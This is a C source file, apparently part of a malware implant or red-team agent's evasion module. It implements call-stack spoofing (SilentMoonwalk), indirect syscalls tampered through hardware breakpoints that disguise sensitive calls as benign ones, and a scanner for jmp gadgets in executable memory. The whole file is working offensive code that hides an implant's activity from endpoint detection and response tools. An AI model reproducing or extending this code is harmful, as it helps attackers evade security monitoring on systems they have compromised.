//
// Created by Brendan Ortiz on 7/25/2024.
//

#include "../../../headers/agent/evasion/Common.h"
#include "../../../headers/cstdreplacement/localcstd.h"

PVOID SpoofStackFunc(
    _In_ PVOID pFunction,
    _In_ INT Nargs,
    _Inout_ ULONG_PTR a,
    _Inout_ ULONG_PTR b,
    _Inout_ ULONG_PTR c,
    _Inout_ ULONG_PTR d,
    _Inout_ ULONG_PTR e,
    _Inout_ ULONG_PTR f,
    _Inout_ ULONG_PTR g,
    _Inout_ ULONG_PTR h,
    _Inout_ ULONG_PTR i
   )
{
    Args args = {0};
    args.Nargs = Nargs;
    args.Arg01 = a;
    args.Arg02 = b;
    args.Arg03 = c;
    args.Arg04 = d;
    args.Arg05 = e;
    args.Arg06 = f;
    args.Arg07 = g;
    args.Arg08 = h;
    args.Arg09 = i;


    return SilentMoonwalkMain(pFunction, &args, agent->Walker->RetAddr);
}

NTSTATUS TemperSyscallAndSpoofStack(
    ULONG_PTR uAddress,
    UINT Nargs,
    ULONG_PTR a,
    ULONG_PTR b,
    ULONG_PTR c,
    ULONG_PTR d,
    ULONG_PTR e,
    ULONG_PTR f,
    ULONG_PTR g,
    ULONG_PTR h,
    ULONG_PTR i,
    ULONG_PTR j,
    ULONG_PTR k
    ) {

    DWORD SSN = 0x00;
    SSN = FetchSSNFromSyscallEntriesViaAddress(uAddress);
    BOOL BENIGN = FALSE;

    NTSTATUS            NtStatus = -1;
    t_NtDummyApi        pDummyApi = NULL;

    for(int i = 0; i < g_BenignSyscallList->u32Count; i++) {
        if(g_BenignSyscallList->Entries[i].SSN == SSN) {
            BENIGN = TRUE;
            break;
        }
    }

    if(!BENIGN) {
        if(!InitHardwareBreakpointHooking()) {
            printf("[error] intializing hardware breakpoints\n");
            return -1;
        }

        pDummyApi = (t_NtDummyApi)g_BenignSyscallList->Entries[GenerateRandomNumber() % g_BenignSyscallList->u32Count].uAddress;
        if(!InitializeTamperedSyscall((ULONG_PTR)pDummyApi, g_SyscallList->Entries[SSN].dw64Hash, Nargs, a, b, c, d, e, f, g, h, i, j, k)) {
            return -1;
        }

        if((NtStatus = SpoofStack(pDummyApi, Nargs)) != 0x00) { // spoof the stack and call the api using NULL args, we've already setup the args in the tampered syscall.
            printf("[!] 0x%llx Failed With Error: 0x%llx \n", g_SyscallList->Entries[SSN].dw64Hash, NtStatus);
            return NtStatus;
        }

        if(!HaltHardwareBreakpointHooking()) {
            printf("[error] attempting to halt hardware breakpoints\n");
            return -1;
        }
    } else { // FUNCTION IS UNHOOKED WHY BOTHER SETING HARDWARE BP & SPOOFING ARGS AT ALL?
       // we should just spoof the stack and call the api. only supported for up to 9 args for now.
        if(Nargs < 10) {
            //printf("[info] num args [%d] | a = [%08x] | b = [%08x]\n", Nargs, a, b);
            if ((NtStatus =(NTSTATUS)SpoofStack(uAddress, Nargs, a, b, c, d, e, f, g, h, i)) != 0x00) {
                printf("[error] 0x%llx attempting to spoof stack for syscall: 0x%llx\n", g_SyscallList->Entries[SSN].dw64Hash, NtStatus);
                return NtStatus;
            }
        }
    }

    return NtStatus;
}

PVOID FindJmpGadget( IN PVOID LOC, IN SIZE_T Len, IN PVOID Pattern, IN SIZE_T PatLen ) {

    MEMORY_BASIC_INFORMATION MBI = {0};
    SIZE_T OutSize = 0;
    int index = 0;

    if ( (!LOC || ! Len) || ( !Pattern || ! PatLen))
        return NULL;

    for ( SIZE_T i = 0; i < Len; i++ ) {
        if ( MemoryCompare( ((PBYTE)LOC + i), Pattern, PatLen ) == 0 ) {

            agent->apis->pNtQueryVirtualMemory(NtCurrentProcess(), ((PBYTE)LOC + i), MemoryBasicInformation, &MBI, sizeof(MEMORY_BASIC_INFORMATION), &OutSize);
            if(MBI.Protect == PAGE_EXECUTE_READWRITE || MBI.Protect == PAGE_EXECUTE_WRITECOPY || MBI.Protect == PAGE_EXECUTE_READ || MBI.Protect == PAGE_EXECUTE) {
                return ((PBYTE)LOC + i);
            }
        }
    }
    return NULL;
}